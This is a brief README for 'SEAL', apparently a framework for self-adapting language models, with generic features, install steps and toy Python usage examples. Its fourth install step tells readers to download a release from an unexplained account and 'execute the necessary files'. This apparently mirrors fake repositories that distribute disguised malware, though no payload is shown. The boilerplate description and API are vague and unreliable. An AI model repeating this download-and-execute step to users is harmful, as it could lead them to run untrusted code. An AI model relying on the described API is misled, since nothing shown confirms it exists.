## Introduction

In the ever-evolving landscape of natural language processing, adapting to new data and contexts is crucial. SEAL provides a framework for language models that can self-adapt based on user interactions and data inputs. This adaptability allows the models to stay relevant and effective in real-world applications.

## Features

- **Self-Adaptation**: Models adjust based on user feedback and new data.
- **Scalability**: Easily scale models to handle large datasets.
- **User-Friendly**: Designed with a simple interface for ease of use.
- **Integration**: Compatible with various platforms and programming languages.

## Installation

To get started with SEAL, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/xvirusx556/SEAL.git
   ```

2. Navigate to the project directory:
   ```bash
   cd SEAL
   ```

3. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

4. For the latest version, download the release from [here](https://github.com/xvirusx556/SEAL/releases). Make sure to execute the necessary files after downloading.

## Usage

To use SEAL, you can follow these simple steps:

1. Import the library in your project:
   ```python
   from seal import LanguageModel
   ```

2. Initialize the model:
   ```python
   model = LanguageModel()
   ```

3. Train the model with your data:
   ```python
   model.train(your_data)
   ```

4. Generate text or predictions:
   ```python
   output = model.generate(input_text)
   print(output)
   ```

## Examples

Here are some practical examples of using SEAL:

### Example 1: Basic Text Generation

```python
from seal import LanguageModel

model = LanguageModel()
model.train("Your training data goes here.")
output = model.generate("Once upon a time")
print(output)
```

### Example 2: Adapting to New Data

```python
from seal import LanguageModel

model = LanguageModel()
model.train("Initial training data.")
new_data = "New data to adapt the model."
model.adapt(new_data)
output = model.generate("What happens next?")
print(output)
```
